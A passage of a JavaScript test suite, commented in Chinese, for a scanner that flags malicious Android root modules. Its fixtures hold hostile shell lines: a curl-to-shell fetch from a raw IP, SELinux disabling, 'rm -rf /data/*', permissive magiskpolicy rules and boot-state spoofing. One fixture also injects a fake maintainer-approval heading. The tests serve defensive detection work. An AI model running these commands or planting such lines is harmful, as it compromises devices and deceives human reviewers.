  // 同一个形状，但那个 .sh 不在包里（运行期才写出来）：解析不到 -> 照报 high，且不许承诺读过
  const ghost = makeModuleZip({ id: 'eval.t1ghost', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/install.sh\n'],
  ]});
  const r2 = await scanToReport(ghost, { changeType: 'first' });
  assert.ok(r2.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    '包内不存在的引用仍然要人工读（fail-closed：多拦可申诉）');
  assert.equal(r2.riskLevel, 'high');

  // 后缀是 .sh 但内容是机器码（魔数赢过后缀）-> 它其实不在扫描面里 -> 必须报、必须升级
  const renamed = makeModuleZip({ id: 'eval.t1ren', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/install.sh\n'],
    ['install.sh', Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'),
      Buffer.from([0, 0]), Buffer.from('setenforce 0\n', 'utf8'), Buffer.alloc(200, 0)])],
  ]});
  const r3 = await scanToReport(renamed, { changeType: 'first' });
  assert.deepEqual(r3.escalated.map((e) => e.resolvedEntry), ['install.sh'],
    '同一个后缀，另一条假设（已扫过）不成立时必须升级');
  assert.ok(r3.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'));
  assert.equal(r3.riskLevel, 'high');
});

test('EXEC_BUNDLED_FILE：规则要接进规则表、分类有中文标签、且 high 参与定级', () => {
  assert.ok(CONTENT_RULES.some((r) => r.id === 'EXEC_BUNDLED_FILE'),
    '不进 CONTENT_RULES 的话 scanContent 根本不会跑它，端到端等于没这条规则');
  assert.equal(RULES_BY_ID.EXEC_BUNDLED_FILE, EXEC_BUNDLED_FILE);
  assert.equal(EXEC_BUNDLED_FILE.severity, 'high');
  assert.equal(EXEC_BUNDLED_FILE.category, 'execution');
  const [f] = EXEC_BUNDLED_FILE.scan('service.sh', 'sh $MODDIR/x.dat');
  assert.equal(f.severity, 'high');
  assert.equal(f.ruleId, 'EXEC_BUNDLED_FILE');
  assert.equal(f.file, 'service.sh');
  assert.equal(f.line, 1);
  assert.equal(countsTowardRisk(f), true, 'high 必须参与定级，不能只提示');
});

test('resolveBundledTargets：只认包内真实存在、大小写原样、且不在扫描面里的条目', () => {
  const files = [
    { name: 'service.sh', content: '#!/system/bin/sh\nsh $MODDIR/x.dat\n' },
    { name: 'x.dat', content: 'echo one\n' },
    { name: 'X.DAT', content: 'echo case\n' },          // 大小写不同的另一份，不许被 fuzzy 命中
    { name: 'bin/y.dat', content: 'echo two\n' },       // 子目录相对路径
    { name: 'ghost.ref', content: 'sh $MODDIR/not-in-zip.dat\n' },
  ];
  const targets = [files[0]];
  const got = resolveBundledTargets(targets, files, 'eval.t1');
  assert.deepEqual(got.map((e) => e.name), ['x.dat'], '只返回包内存在且未被扫描的那一条');
  assert.equal(got[0].__from, 'service.sh', '要能指出是谁引用了它');
  assert.equal(got[0].__line, 2, '行号是引用行的行号，不是文件行号');
  assert.equal(got[0].__ref, 'sh $MODDIR/x.dat', '引用原文要留在报告里供人工复验');
  assert.equal(got[0].content, 'echo one\n', '升级条目必须带着内容，否则下面扫不到');

  // 已在扫描面里的不重复追加
  assert.deepEqual(resolveBundledTargets([targets[0], files[1]], files, 'eval.t1'), [],
    '已在扫描面里的条目不再取一次，否则同一份内容被扫两遍');
  // 「文本后缀就不再升级」这条旧判据已被评审 fix1-① 否掉：后缀不代表已扫过。
  // 换成看扫描面成员 —— helper.sh 真在扫描面里时不重复取，不在时（例如它是改名成 .sh 的机器码，
  // classify 把它落到 binaries）必须取进来。
  const realTargets = [{ name: 'service.sh', content: 'sh $MODDIR/helper.sh\n' },
    { name: 'helper.sh', content: 'rm -rf /data/*\n' }];
  assert.deepEqual(resolveBundledTargets(realTargets, realTargets, 'm').map((e) => e.name), [],
    '已在扫描面里的 .sh 不再取一次，否则同一份内容被扫两遍');
  const disguisedTargets = [{ name: 'service.sh', content: 'sh $MODDIR/helper.sh\n' }];
  const disguisedFiles = [...disguisedTargets, { name: 'helper.sh', content: 'rm -rf /data/*\n' }];
  assert.deepEqual(resolveBundledTargets(disguisedTargets, disguisedFiles, 'm').map((e) => e.name),
    ['helper.sh'], '后缀是 .sh 但确实不在扫描面里时，它就没被逐行扫过 —— 必须升级');
  // 指向别的模块目录的绝对路径不算包内条目
  const other = [{ name: 'service.sh', content: 'sh /data/adb/modules/other_mod/x.dat\n' }];
  assert.deepEqual(resolveBundledTargets(other, files, 'eval.t1'), [],
    '模块 id 不匹配时不许把 /data/adb/modules/<别的 id>/ 折进本包');
  // 引用了包内不存在的文件：不升级（那条引用由行级规则自己报）
  const ghost = [{ name: 'ghost.ref', content: files[4].content }];
  assert.deepEqual(resolveBundledTargets(ghost, files, 'eval.t1'), []);
  // 只递归一层：x.dat 自己的引用不再追随（防环，也把链路长度钉死在报告可读的范围）
  const chained = [
    { name: 'service.sh', content: 'sh $MODDIR/x.dat\n' },
    { name: 'x.dat', content: 'sh $MODDIR/bin/y.dat\n' },
    { name: 'bin/y.dat', content: 'echo deep\n' },
  ];
  assert.deepEqual(resolveBundledTargets([chained[0], chained[1]], chained, 'm').map((e) => e.name), ['bin/y.dat'],
    '一层升级：只从初始扫描面出发');
  assert.deepEqual(resolveBundledTargets([chained[0]], chained, 'm').map((e) => e.name), ['x.dat'],
    '从 service.sh 出发只到 x.dat，不再往下追');
});

test('端到端：被 sh 引用的伪装二进制照样进扫描面（这条压过「像不像文本」）', async () => {
  // 硬要求 3：载荷填成二进制样躲过文本判定是现成的逃逸阀，所以「被引用」这件事本身就够纳入。
  const zip = makeModuleZip({ id: 'eval.t1b', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.bin\n'],
    ['payload.bin', Buffer.concat([Buffer.from('setenforce 0\n', 'utf8'), Buffer.from([0x00]),
      Buffer.from('curl http://45.77.1.2/x.sh | sh\n', 'utf8')])],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.ok(r.binaries.some((b) => b.name === 'payload.bin'), '它确实先被 classify 认成二进制，才谈得上升级');
  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.bin']);
  assert.equal(r.escalated[0].fromFile, 'service.sh');
  assert.equal(r.escalated[0].fromLine, 2);
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.ok(sel, '升级之后要真的按文本逐行扫过');
  assert.equal(sel.file, 'payload.bin');
  assert.equal(sel.line, 1);
  assert.ok(r.scripts.some((s) => s.name === 'payload.bin'), '升级条目要出现在人看得见的全文里');
  assert.ok(r.inventory.escalated.some((e) => e.name === 'payload.bin'), '也要出现在清单里');
  assert.equal(r.riskLevel, 'high');
});

test('端到端：引用的路径不在包内时不升级，但引用行本身照样报 high', async () => {
  // 分工：行级规则只管「脚本执行了模块目录里的另一个文件」，升级只认真实存在的条目。
  const zip = makeModuleZip({ id: 'eval.t1c', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/ghost.dat\n'],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.deepEqual(r.escalated, [], '包内没有 ghost.dat，无内容可拉进扫描面');
  assert.deepEqual(r.inventory.escalated, []);
  assert.ok(!r.scripts.some((s) => s.name === 'ghost.dat'));
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
  assert.equal(r.riskLevel, 'high', '运行期才出现的可执行目标同样要人工读');
});

test('端到端：升级链路在报告里看得见（escalated + inventory + Markdown 引用链）', async () => {
  // —— (a) 真升级那一格：载荷在 feed 之外（魔数头伪装成 .dat → binaries 桶），由 service.sh 的引用拉进来。
  // report.escalated 的语义就应该是这一格：「原本不在扫描面、因引用被拉进来的条目」。
  const binZip = makeModuleZip({ id: 'eval.t1dbin', files: [
    ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1dbin/stage.dat\n'],
    ['stage.dat', elfWith('setenforce 0\n')],
  ]});
  const rb = await scanToReport(binZip, { changeType: 'first' });
  assert.deepEqual(rb.escalated, [
    { fromFile: 'service.sh', fromLine: 2, ref: 'sh /data/adb/modules/eval.t1dbin/stage.dat', resolvedEntry: 'stage.dat' },
  ]);
  assert.deepEqual(rb.inventory.escalated.map((e) => [e.name, e.fromFile, e.fromLine]), [['stage.dat', 'service.sh', 2]]);
  // 升级过的条目不再出现在「未纳入行级扫描的数据文件」里 —— 它已经被扫了
  assert.ok(!rb.inventory.otherFiles.includes('stage.dat'), JSON.stringify(rb.inventory.otherFiles));
  const mdb = renderMarkdown(rb);
  assert.match(mdb, /被脚本引用而\*\*升级进扫描面\*\*的条目/);
  assert.match(mdb, /stage\.dat/);
  assert.ok(mdb.includes('| 被引用升级（原本不在扫描面） | `stage.dat` |'), '文件清单表里也要有它一行');
  assert.match(mdb, /`service\.sh:2`/);
  assert.ok(rb.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'stage.dat'),
    '升级不是记账游戏：拉进来之后必须真被逐行读过：' + JSON.stringify(rb.findings.map((f) => f.ruleId)));
  const jb = JSON.parse(renderJSON(rb));
  assert.deepEqual(jb.escalated, rb.escalated, 'escalated 是报告字段，不是 finding，JSON 里原样保留');

  // —— (b) P11 那一格：载荷是名单外的**可读文本**，本来就在 feed 上，所以没有升级证人。
  // 少掉的只有「它曾被拉进来」这句记账，读到的东西一个字都没少：全文进了「逐行扫过的文件全文」，
  // 载荷内容自己出了 finding，引用方也仍然被 EXEC_BUNDLED_FILE/high 指名（covered 判在扩面之前的面）。
  const r = await scanToReport(makeModuleZip({ id: 'eval.t1d', files: [
    ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1d/stage.dat\n'],
    ['stage.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
  ]}), { changeType: 'first' });
  assert.deepEqual(r.escalated, [],
    'stage.dat 已经在 feed 上：escalated 只记「原本不在扫描面」的条目，不许为它作伪证');
  assert.deepEqual(r.inventory.escalated, [], '清单里的升级行同理，不许凭空多一笔');
  assert.ok(!r.inventory.otherFiles.includes('stage.dat'), JSON.stringify(r.inventory.otherFiles));
  assert.ok(r.scripts.some((s) => s.name === 'stage.dat'),
    '载荷必须在被逐行扫过的文件里：' + JSON.stringify(r.scripts.map((s) => s.name)));
  const md = renderMarkdown(r);
  assert.match(md, /## 逐行扫过的文件全文[\s\S]*curl http:\/\/45\.77\.1\.2\/x\.sh \| sh/);
  assert.ok(r.findings.some((f) => f.ruleId === 'PIPE_TO_SHELL' && f.file === 'stage.dat' && f.severity === 'high'),
    '载荷的内容必须真被读到并出发现：' + JSON.stringify(r.findings.map((f) => `${f.ruleId}/${f.severity}`)));
  const eb = r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.equal(eb && eb.severity, 'high',
    '作证的角色落在 EXEC_BUNDLED_FILE 自己身上：它必须还在、还是 high');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

/** ELF 头 + 埋一行明文给行级规则读 + 补零：魔数是机器码，名字随用例挑 */
function elfWith(text, pad = 200) {
  return Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.from([0, 0]),
    Buffer.from(text, 'utf8'), Buffer.alloc(pad, 0)]);
}

/**
 * 按 CommonMark/GitHub 语义走一遍 Markdown，返回落在代码围栏「之外」的标题行。
 * 开栏长度 n，只有整行反引号数 >= n 才闭栏 —— 围栏体内的一切都不参与渲染。
 */
function headingsOutsideFence(md) {
  let fence = 0;
  const out = [];
  for (const line of String(md).split(/\r?\n/)) {
    const m = line.match(/^ {0,3}(`{3,})([^`]*)$/);
    if (m) {
      if (fence === 0) fence = m[1].length;
      else if (m[1].length >= fence) fence = 0;
      continue;
    }
    if (fence === 0 && /^#{1,6}\s/.test(line)) out.push(line);
  }
  return out;
}

test('fix1-①：改名成 .js / .sh 的 ELF 被 sh 引用时闸不再静默失效（升级 + 逐行扫 + high）', async () => {
  for (const name of ['payload.js', 'payload.sh']) {
    const zip = makeModuleZip({ id: 'eval.h1', files: [
      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/' + name + '\n'],
      [name, elfWith('setenforce 0\n')],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    const ids = r.findings.map((f) => f.ruleId);
    assert.ok(r.binaries.some((b) => b.name === name), 'classify 认它是二进制（魔数赢过后缀）');
    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [name], '评审实测 escalated 曾是 []');
    const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
    assert.ok(sel, '该内容必须进行级扫描（评审实测一行都没扫）');
    assert.equal(sel.file, name);
    assert.equal(sel.line, 1);
    assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
    assert.equal(r.riskLevel, 'high', '评审实测这里曾只有 medium');
    assert.equal(r.decision.action, 'block');
  }
});

test('fix1-②：同一行不许自我豁免 —— 两个引用一个合法一个恶意，恶意那个必须报', async () => {
  for (const ref of [
    'sh $MODDIR/payload.dat && sh $MODDIR/install.sh',
    'sh $MODDIR/install.sh && sh $MODDIR/payload.dat',
    'sh $MODDIR/payload.dat  # 这行只是调用 install.sh 的包装',
  ]) {
    const zip = makeModuleZip({ id: 'eval.h2', files: [
      ['service.sh', '#!/system/bin/sh\n' + ref + '\n'],
      ['install.sh', 'echo install\n'],
      ['payload.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    const ids = r.findings.map((f) => f.ruleId);
    // Task 2.7（fix10-P11）：payload.dat 是名单外的可读文本，现在本来就在 feed 上 —— 它不再「被拉进来」，
    // 所以 escalated 空是正确结果。这条用例的证人换了落点：载荷自己的 PIPE_TO_SHELL/high 与引用方的
    // EXEC_BUNDLED_FILE/high 都还在（covered 判在扩面之前的五个桶上，撤销不成立）。
    assert.deepEqual(r.escalated, [], ref + ' —— payload.dat 已在 feed 上，不许再记一笔升级证人');
    assert.ok(r.scripts.some((s) => s.name === 'payload.dat'),
      ref + ' —— 载荷必须被逐行扫过：' + JSON.stringify(r.scripts.map((s) => s.name)));
    assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ref);
    assert.ok(ids.includes('PIPE_TO_SHELL'), '载荷必须按文本再扫一遍');
    assert.equal(r.findings.find((f) => f.ruleId === 'PIPE_TO_SHELL').file, 'payload.dat');
    assert.equal(r.riskLevel, 'high', ref + ' —— 评审实测曾是 0 命中 / low');
    // install.sh 已被逐行扫过，不该由它说话：snippet 要指向真正没被扫过的载荷。
    // ↓ 这一条在本轮**保持红**，等一个代码侧决定，不许靠改断言变绿（详见 task-2.7-report.md 的停手项）：
    //   applyBundledRefVerdicts 的 `cause` 只认「被升级的 > 钉不住的 > 解析不到的」三种落点，
    //   P11 之后载荷已在 feed 上、没有升级条目 ⇒ cause 为空 ⇒ snippet 退回规则自己的最左匹配，
    //   于是第二种写法（良性引用在最左）把报告指到了 install.sh 上。判据、等级、结论都没松，
    //   松的是「谁为这条 high 作证」的指向。
    assert.match(r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE').snippet, /payload\.dat/);
  }
});

test('fix1-③：升级进来的非文本条目只给有界预览，机器码不进全文与产物', async () => {
  const blob = Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.alloc(1024 * 1024, 0)]);
  const zip = makeModuleZip({ id: 'eval.h3', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.conf\n'],
    ['payload.conf', blob],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.conf'],
    '扫描面与渲染面分开：不许为了渲染方便把它退回名单外');
  const row = r.scripts.find((s) => s.name === 'payload.conf');
  assert.ok(row, '它还得在人看得见的清单里（F11）');
  assert.equal(row.nonText, true);
  assert.equal(row.contentKind, 'non-text-preview');
  assert.ok(row.nulCount > 100000, '预览要报出 NUL 个数，实际 ' + row.nulCount);
  assert.ok(!row.content.includes('\u0000'), '正文里不许有 NUL');
  assert.ok(row.content.length < 1000, '必须是有限预览，实际 ' + row.content.length + ' 字符');
  assert.match(row.content, /内容非文本/);
  assert.match(row.content, /7f 45 4c 46/);
  const md = renderMarkdown(r);
  const json = renderJSON(r);
  assert.ok(Buffer.byteLength(md) < 32 * 1024, 'md 曾被灌成 1.03 MB，实际 ' + Buffer.byteLength(md) + ' B');
  assert.ok(!md.includes('\u0000'), 'md 曾被灌成 52 万个 NUL');
  assert.ok(Buffer.byteLength(json) < 64 * 1024, 'json 曾被灌成 50 MB，实际 ' + Buffer.byteLength(json) + ' B');
  assert.match(md, /非文本：只给有界预览/);
});

test('fix1-③：围栏体里的反引号关不掉公开评论的围栏 —— 投稿者写的假标题不外漏', async () => {
  const evil = '#!/system/bin/sh\nsh $MODDIR/tool.bin\n```\n\n## 已由维护者批准 ✅\n\n无需人工复核\n````\n';
  const zip = makeModuleZip({ id: 'eval.h3b', files: [
    ['service.sh', evil],
    ['tool.bin', elfWith('setenforce 0\n')],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  const md = renderMarkdown(r);
  const outside = headingsOutsideFence(md);
  assert.ok(!outside.some((l) => l.includes('已由维护者批准')),
    '注入的假标题被当成报告自己的标题渲染了：' + JSON.stringify(outside.slice(0, 8)));
  // 开栏/闭栏的长度要压过正文里最长的反引号串（这里是 4 个），否则正文的 ``` 能提前闭栏
  const opener = md.match(/^(`{3,})sh$/m);
  assert.ok(opener, '「逐行扫过的文件全文」一节要有以 sh 标注的开栏');
  assert.ok(opener[1].length > 4,
    '开栏长度必须压过正文里最长的反引号串，实际 ' + opener[1].length + ' 个');
  assert.ok(md.includes('## 已由维护者批准'), '显示层防护不许吃掉原文（人工要看的就是原文）');
});

test('fix1-④：注释行豁免；echo / source / 单引号 / ${IFS} / 直接执行一律不许豁免', async () => {
  // 注释里的引用不是执行 —— 按本仓 /^\s*#/ 的既有先例不报 high（评审实测它曾报 high，是误伤）。
  const commented = makeModuleZip({ id: 'eval.h4a', files: [
    ['service.sh', '#!/system/bin/sh\n# sh $MODDIR/notes.dat\nexit 0\n'],
    ['notes.dat', 'echo documented\n'],
  ]});
  const a = await scanToReport(commented, { changeType: 'first' });
  assert.ok(!a.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    JSON.stringify(a.findings.map((f) => f.ruleId)));
  assert.equal(a.riskLevel, 'low', JSON.stringify(a.findings));
  // Task 2.7（fix10-P11）：notes.dat 是名单外的可读文本，本来就在 feed 上，不再有升级证人。
  // 「豁免只作用于报不报、被引用的条目照样要读」这条主张换到它真正的落点上：它在被逐行扫过的那份里。
  assert.ok(a.scripts.some((s) => s.name === 'notes.dat'),
    '注释行豁免不许让 notes.dat 免检：它必须被逐行扫过 —— ' + JSON.stringify(a.scripts.map((s) => s.name)));
  assert.deepEqual(a.escalated, [], 'notes.dat 已在 feed 上：不许为它记一笔没发生过的升级');

  for (const [line, want] of [
    ['echo hi sh $MODDIR/x.dat', 'x.dat'],
    ['. $MODDIR/functions', 'functions'],
    ["sh '$MODDIR/lib.dat'", 'lib.dat'],
    ['sh${IFS}$MODDIR/x.bin', 'x.bin'],
    ['$MODDIR/tool.bin', 'tool.bin'],
    ['do_thing || $MODDIR/stage2.bin', 'stage2.bin'],
  ]) {
    const zip = makeModuleZip({ id: 'eval.h4b', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      [want, 'echo payload\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    assert.ok(r.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'), line + ' 必须报');
    // Task 2.7（fix10-P11）：这些载荷都是可读文本，本来就在 feed 上 → 没有升级证人，但必须真被读过。
    assert.ok(r.scripts.some((s) => s.name === want),
      line + ' 必须把 ' + want + ' 读掉：' + JSON.stringify(r.scripts.map((s) => s.name)));
    assert.deepEqual(r.escalated, [], line + ' —— ' + want + ' 已在 feed 上，不许记没发生过的升级');
    assert.equal(r.riskLevel, 'high', line);
  }
});

test('fix1-⑤：归一化覆盖 //、..、.、反斜杠、大小写变体', async () => {
  assert.equal(normalizeRefPath('sub/../x.dat'), 'x.dat');
  assert.equal(normalizeRefPath('sub/./x.dat'), 'sub/x.dat');
  assert.equal(normalizeRefPath('//x.dat'), 'x.dat');
  assert.equal(normalizeRefPath('sub\\..\\x.dat'), 'x.dat');
  assert.equal(normalizeRefPath('../escape.dat'), null, '上跳越出模块根目录的不算包内条目');

  for (const [line, want] of [
    ['sh $MODDIR//norm.dat', 'norm.dat'],
    ['sh $MODDIR/sub/../norm.dat', 'norm.dat'],
    ['sh $MODDIR/./norm.dat', 'norm.dat'],
    ['sh $MODDIR\\sub\\inner.dat', 'sub/inner.dat'],
    ['sh $MODDIR/NORM.DAT', 'norm.dat'],
  ]) {
    const zip = makeModuleZip({ id: 'eval.h5', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      ['norm.dat', 'setenforce 0\n'],
      ['sub/inner.dat', 'setenforce 0\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    // Task 2.7（fix10-P11）：归一化指向的 .dat 现在本来就在 feed 上，所以没有升级证人；
    // 「归一化之后要真的把那个条目读了」这条主张由下面 SELINUX_DISABLE 那句钉着，一件没少。
    assert.ok(r.scripts.some((s) => s.name === want),
      line + ' 归一化后的 ' + want + ' 必须在被逐行扫过的文件里：'
      + JSON.stringify(r.scripts.map((s) => s.name)));
    assert.deepEqual(r.escalated, [], line + ' —— ' + want + ' 已在 feed 上，不许记没发生过的升级');
    const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
    assert.equal(f.advice, EXEC_BUNDLED_FILE.advice, '解析到并读过了，才允许保留「读一遍」那句承诺');
    assert.ok(r.findings.some((x) => x.ruleId === 'SELINUX_DISABLE' && x.file === want),
      '归一化之后要真的把那个条目读了：' + line);
  }
});

test('fix1-⑤：归一化后仍解析不到时，报告不许承诺它没做到的事', async () => {
  for (const line of ['sh $MODDIR/ghost.dat', 'sh $MODDIR/../escape.dat', 'sh $MODDIR/$SUB/x.dat']) {
    const zip = makeModuleZip({ id: 'eval.h5b', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      ['x.dat', 'setenforce 0\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    assert.deepEqual(r.escalated, [], line + ' 解析不到条目，不该假装升级');
    const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
    assert.ok(f, line + ' 仍要报（fail-closed：多拦可申诉）');
    assert.equal(f.advice, EXEC_UNRESOLVED_ADVICE);
    assert.ok(!f.advice.includes('读一遍'), '不许在报告里说「把那个文件也读一遍」而实际没读');
    assert.equal(r.riskLevel, 'high', line);
  }
});

test('fix1-⑥：同一载荷被多种写法引用只升级一次；同名不同内容的重复条目全都要扫', async () => {
  // Task 2.7（fix10-P11）把「升级证人」和「读没读」分成了两格：
  //   * 可读文本载荷（.dat）现在本来就在 feed 上 → escalated 必须是空，去重要看 scripts 里出现几行；
  //   * feed 之外的载荷（魔数头伪装成 .dat → binaries）仍然只能靠引用被拉进来 → 原来那三条去重
  //     断言一字不动地钉在它身上。
  // 两格都跑，是因为这条用例真正要钉的是「同一个内容只进扫描面一次 / 不同内容都要进」，
  // 而不是「escalated 里必须有东西」。
  const REF3 = '#!/system/bin/sh\nsh $MODDIR/payload.dat\nsh $MODDIR//payload.dat\nbash ${MODDIR}/payload.dat\n';

  // —— (a) 可读文本：三种写法指向同一份内容，feed 里只能有一份
  const a = await scanToReport(makeModuleZip({ id: 'eval.h6a', files: [
    ['service.sh', REF3],
    ['payload.dat', 'echo one\n'],
  ]}), { changeType: 'first' });
  assert.deepEqual(a.escalated, [], 'payload.dat 已在 feed 上：不许记一笔没发生过的升级');
  assert.equal(a.scripts.filter((s) => s.name === 'payload.dat').length, 1,
    '三种写法指向同一份内容，被逐行扫过的清单里只能有一行：'
    + JSON.stringify(a.scripts.map((s) => s.name)));

  // —— (a-bin) 同形状，载荷换成 feed 之外的二进制：原三条升级断言一字不动
  const ab = await scanToReport(makeModuleZip({ id: 'eval.h6abin', files: [
    ['service.sh', REF3],
    ['payload.dat', elfWith('echo one\n')],
  ]}), { changeType: 'first' });
  assert.equal(ab.escalated.length, 1, '三种写法指向同一份内容，扫描面里只能有一份');
  assert.equal(ab.scripts.filter((s) => s.name === 'payload.dat').length, 1);
  assert.equal(ab.inventory.escalated.length, 1);

  // —— (b) 同名不同内容的文本重复：两份都得被读到，否则「放两份同名、审核读干净那份」就成立了
  const b = await scanToReport(makeModuleZip({ id: 'eval.h6b', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/dup.dat\n'],
    ['dup.dat', 'setenforce 0\n'],
    ['dup.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
  ]}), { changeType: 'first' });
  assert.equal(b.scripts.filter((s) => s.name === 'dup.dat').length, 2,
    '同名不同内容的两份都要被逐行扫过：' + JSON.stringify(b.scripts.map((s) => s.name)));
  assert.deepEqual(b.escalated, [], '两份都已在 feed 上：没有升级证人，但两条内容都读到了');
  const ids = b.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('SELINUX_DISABLE') && ids.includes('PIPE_TO_SHELL'), ids.join(','));
  assert.ok(ids.includes('STRUCT_DUPLICATE_NAME'), ids.join(','));

  // —— (b-bin) 同形状换成 feed 之外：原「两份都要升级」的断言一字不动
  const bb = await scanToReport(makeModuleZip({ id: 'eval.h6bbin', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/dup.dat\n'],
    ['dup.dat', elfWith('setenforce 0\n')],
    ['dup.dat', elfWith('curl http://45.77.1.2/x.sh | sh\n')],
  ]}), { changeType: 'first' });
  assert.deepEqual(bb.escalated.map((e) => e.resolvedEntry), ['dup.dat', 'dup.dat'],
    '同名不同内容的两份都要升级；去重只去「内容相同」的那一类');

  // —— (c) 同名同内容的文本重复：扩面之后两份都在 feed 上（比 BASE 多读了一遍，不松），
  // 「同内容只算一份」的去重由 feed 之外的 (c-bin) 钉住。
  const c = await scanToReport(makeModuleZip({ id: 'eval.h6c', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/same.dat\nsh $MODDIR//same.dat\n'],
    ['same.dat', 'echo same\n'],
    ['same.dat', 'echo same\n'],
  ]}), { changeType: 'first' });
  assert.equal(c.scripts.filter((s) => s.name === 'same.dat').length, 2,
    '同名同内容的可读文本现在两份都进 feed（BASE 上一份都没读，只有引用时才升级一份）：'
    + JSON.stringify(c.scripts.map((s) => s.name)));
  assert.deepEqual(c.escalated, [], '它们本来就在 feed 上：escalated 里不许出现');

  // —— (c-bin) 内容完全相同的重复条目只扫一遍，别把产物灌两遍
  const cb = await scanToReport(makeModuleZip({ id: 'eval.h6cbin', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/same.dat\nsh $MODDIR//same.dat\n'],
    ['same.dat', elfWith('echo same\n')],
    ['same.dat', elfWith('echo same\n')],
  ]}), { changeType: 'first' });
  assert.equal(cb.escalated.length, 1, '同名的两份同内容条目算一份，扫描面里不许出现两遍');
  assert.equal(cb.scripts.filter((s) => s.name === 'same.dat').length, 1,
    '同上：被逐行扫过的清单里也只许一行：' + JSON.stringify(cb.scripts.map((s) => s.name)));
});

test('fixtures：干净模块带 changeType: first 仍可自动放行，不带 opts 则不可达（F15）', async () => {
  const clean = makeModuleZip({ id: 'eval.clean', files: [['service.sh', CLEAN_SH]] });
  const withOpts = await scanToReport(clean, { changeType: 'first' });
  assert.equal(withOpts.meta.id, 'eval.clean', 'makeModuleZip 必须自带 module.prop，否则 id 解析不到');
  assert.equal(withOpts.riskLevel, 'low', JSON.stringify(withOpts.findings));
  assert.equal(withOpts.decision.action, 'auto-approve');
  assert.deepEqual(withOpts.escalated, [], '干净模块不该有升级条目');
  assert.ok(!withOpts.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    CLEAN_SH + ' 里的 `cp -f busybox $MODPATH/...` 不是执行别的文件');

  // 同一个包不带 opts：changeType 落到 unknown，low+unknown 只能是 request-review。
  // 这条断言是留着提醒回归表：scanToReport(zip) 这个形状下「干净模块自动放行」永远测不到。
  const bare = await scanToReport(clean);
  assert.equal(bare.changeType, 'unknown');
  assert.equal(bare.decision.action, 'request-review');
  assert.equal(bare.riskLevel, 'low');

  assert.match(moduleProp('eval.x'), /^id=eval\.x$/m);
});

// ---------------------------------------------------------------------------
// ⑧ root 提权语义（T2：sepolicy.rule/.rc/.te/shebang 无后缀进扫描面 + 5 条新规则）
// ---------------------------------------------------------------------------

// —— 简报 Step 1 原文，四条各一条，全用实测原句 ——
const ROOT_CASES = [
  ['sepolicy.rule', 'allow su * fs:file { read write open execute };\n', 'SELINUX_POLICY_RELAX'],
  ['service.sh', 'magiskpolicy --live "allow su * *"\n', 'MAGISK_POLICY_LIVE'],
  ['service.sh', 'resetprop -w ro.boot.verifiedbootstate green\n', 'VERIFIED_BOOT_SPOOF'],
  ['service.sh', 'resetprop -w ro.debuggable 1\n', 'DEBUGGABLE_ENABLE'],
];
for (const [name, body, ruleId] of ROOT_CASES) {
  test(`${ruleId}：${name} 命中且判 high/medium 正确`, async () => {
    const r = await scanToReport(makeModuleZip({ id: 'eval.t2', files: [['module.prop', moduleProp('eval.t2')], [name, body]] }));
    assert.ok(r.findings.some((f) => f.ruleId === ruleId), JSON.stringify(r.findings.map((f) => f.ruleId)));
